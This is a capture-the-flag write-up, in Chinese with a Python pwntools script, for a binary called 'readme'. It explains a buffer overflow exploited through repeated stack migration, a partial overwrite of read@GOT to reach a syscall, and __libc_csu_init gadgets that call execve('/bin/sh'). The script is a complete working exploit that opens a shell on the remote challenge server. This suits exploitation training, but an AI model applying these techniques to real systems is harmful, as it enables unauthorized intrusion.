## readme
### Solution
本題的binary單純從輸入讀`0x30`個bytes到長度為`0x20`的buffer中，總共可以overflow的大小為`0x8`，只能往前放一個rbp + return address，但由於main的尾端是`read(0, [rbp-0x20], 0x30)`，因此我們能利用這段作為gadget進行migrartion。

由於`leave`後`rsp`會等於`rbp`，而寫入從`rbp-0x20`開始，因此輸入的有效的部份仍然只有後面的`0x10`的大小(2個gadget)，但我們可以先將部份的ROP chain依次填到前面的0x20個bytes，接著不斷的反覆migration，每次寫的位置增加0x20個bytes，如此我們就能將完整的ROP chain寫到buf1上。

因此，從`.bss`尾端切兩個buffer，`buf1`共`0x160` bytes、中間間隔`0x20` bytes，接著是`buf2`共`0x20` bytes，`buf2`只用來做migration，

接著不斷地在buf1 + 0x20 * i (i是次數)和buf2之間migrate，利用前20個bytes不斷將整個ROP chain全部寫到buf1後，再跳至buf1執行ROP chain。

接著，ROP chain的部份，可用的gadget有rdi和rsi，沒有syscall，printf對stack的需求過大也無法用來leak libc，但是本題只開啟Partial RELRO，所以我們可以partial overwrite GOT來使read@plt指到syscall(將GOT LSB的`0x20`蓋為`0x2e`)。

有了syscall後作法其實很多，可以先以write leak出libc，接著讀進`system("sh")`，但也可以直接使用execve("/bin/sh", 0, 0)，這邊使用了後者作法。

後者作法的難在要使`rax`為59，但沒有`rax`的gadget，且`read@got`已被修改，所以這裡使用`write(1, buf1, 0x59)`來改變rax。 這處使用了一個在`__libc_csu_init`中的code segment，如下
```asm
  400690:       4c 89 ea                mov    rdx,r13
  400693:       4c 89 f6                mov    rsi,r14
  400696:       44 89 ff                mov    edi,r15d
  400699:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
  40069d:       48 83 c3 01             add    rbx,0x1
  4006a1:       48 39 eb                cmp    rbx,rbp
  4006a4:       75 ea                   jne    400690 <__libc_csu_init+0x40>
  4006a6:       48 83 c4 08             add    rsp,0x8
  4006aa:       5b                      pop    rbx
  4006ab:       5d                      pop    rbp
  4006ac:       41 5c                   pop    r12
  4006ae:       41 5d                   pop    r13
  4006b0:       41 5e                   pop    r14
  4006b2:       41 5f                   pop    r15
  4006b4:       c3                      ret    
```
我們利用下面的gadget可以控制rbx, rbp, r12, r13, r14, r15，接著return到上面的部份就可以控制到rdi, rsi, rdx以及function address，因此這裡連續使用了兩次這個segment，第一次執行write(1, buf1, 59)，第二次執行execve("/bin/sh", 0, 0)。

由於第一次執行完後會繼續往下執行，其中有一個分支
```
add rbx, 0x1
cmp rbx, rbp
jne 400690
```
為了使其fallthrough，`rbx`和`rbp`必須考慮constraint：
* `[rbx + 1] = rbp`

call的目標為：
* `[r12 + rbx * 8] = read@plt(syscall)`

最後我們可以計算出：
* `r12 = read@plt - rbx * 8`
* `rbx = rbp - 1`

而fallthrough之後有一行`add rsp, 0x8`，因此ROP chain必須在中間再加8個bytes的padding，最後執行execve時就不用考慮fallthrough的constrain，令`rbx = 0`，`r12 = read@plt`即可。

### script
```python
#!/usr/bin/env python3
from pwn import *

context.update(arch='amd64', os='linux')
binary = ELF('readme')
rop = ROP(binary)

#r = process("readme")
r = remote('csie.ctf.tw', 10135)

buf1 = (binary.bss() & ~0xfff) + 0x1000 - 0x200
buf2 = (binary.bss() & ~0xfff) + 0x1000 - 0x20

buf1_rop = [buf2, # rbp = buf2
            # partial overwrite read@got
            # 0x20 -> 0x2e (syscall)
            # read(0, read@got, 0x30)
            rop.rsi.address, binary.got[b'read'], 0,
            binary.plt[b'read'],
            # makes rax = write(1, buf1, 59) = 59(execve)
            # constraint : [rbx + 1]  = [rbp]
            #              [r12 + rbx * 8] = read_got
            0x4006aa,
            buf2 - 1,                 # rbx
            buf2,                     # rbp
binary.got[b'read'] - (buf2 - 1) * 8, # r12
            59,                       # r13 -> rdx
            buf1,                     # r14 -> rsi
            1,                        # r15 -> rdi
            # execve("/bin/sh", 0, 0)
            0x400690,
            0,                        # padding (add rsp, 0x8)
            0,                        # rbx
            buf2,                     # rbp
            binary.got[b'read'],      # r12
            0,                        # r13 -> rdx
            0,                        # r14 -> rsi
            buf2 - 0x20,              # r15 -> rdi
            0x400690,
            0, 0, 0                   # padding
            ]

# 1. Migrate stack to buf1 + 0x20
payload = cyclic(32).encode()
payload += p64(buf1 + 0x20) # rbp = buf1 + 0x20
payload += flat([0x40062b]) # read(0, buf1, 0x30)
r.send(payload)

# 2. Keep migrate, until whole ROP chain write to buf1
for i in range(len(buf1_rop)//4):
    payload = flat(buf1_rop[i * 4:(i + 1) * 4])
    payload += p64(buf2)
    payload += flat([0x40062b]) # read(0, buf2, 0x30)
    r.send(payload)

    if i == len(buf1_rop)//4 - 1:
        break
    payload = b"A" * 0x20
    payload += p64(buf1 + 0x20 * (i + 2))
    payload += flat([0x40062b]) # read(0, [buf1 + 0x20 * (i+1)], 0x30)
    r.send(payload)

# 3. migrate stack back to buf1
payload = flat(["/bin/sh\x00", 0, 0, 0])
payload += p64(buf1)
payload += flat([rop.leave.address])
r.send(payload)

# 4. value to overwrite got
r.send(b'\x2e')

r.interactive()
```
